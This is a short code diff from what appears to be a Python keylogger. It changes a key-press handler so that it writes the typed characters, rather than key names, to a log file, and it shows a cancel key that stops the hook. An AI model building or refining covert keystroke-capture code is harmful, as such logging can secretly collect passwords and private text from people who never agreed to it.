@@ -46,7 +46,7 @@ def main():
 
     def OnKeyPress(event):
         with open(log_file, 'a') as f:
-            f.write('{}\n'.format(event.Key))
+            f.write('{}\n'.format(chr(event.Ascii)))
 
         if event.Ascii == cancel_key:
             new_hook.cancel()
